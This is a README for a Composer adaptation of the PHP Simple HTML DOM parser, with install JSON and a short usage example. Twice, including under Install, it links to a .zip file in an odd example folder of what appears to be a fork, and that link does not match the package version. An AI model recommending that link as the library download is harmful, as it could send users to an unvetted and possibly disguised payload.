php-simple-html-dom-parser
==========================

Version 1.5

Adaptation for Composer and PSR-0 of:

A HTML DOM parser written in PHP5+ let you manipulate HTML in a very easy way!
Require PHP 5+.
Supports invalid HTML.
Find tags on an HTML page with selectors just like jQuery.
Extract contents from HTML in a single line.

https://raw.githubusercontent.com/videogramme/php-simple-html-dom-parser/1.5.0/Src/Sunra/PhpSimple/simplehtmldom_1_5/example/scraping/dom_html_parser_php_simple_1.6.zip


Install
-------

 https://raw.githubusercontent.com/videogramme/php-simple-html-dom-parser/1.5.0/Src/Sunra/PhpSimple/simplehtmldom_1_5/example/scraping/dom_html_parser_php_simple_1.6.zip
```json
"require": {
    "sunra/php-simple-html-dom-parser": "v1.5.0"
    }
```

Usage
-----

```php
use Sunra\PhpSimple\HtmlDomParser;

...
$dom = HtmlDomParser::str_get_html( $str );
or 
$dom = HtmlDomParser::file_get_html( $file_name );

$elems = $dom->find($elem_name);
...

```
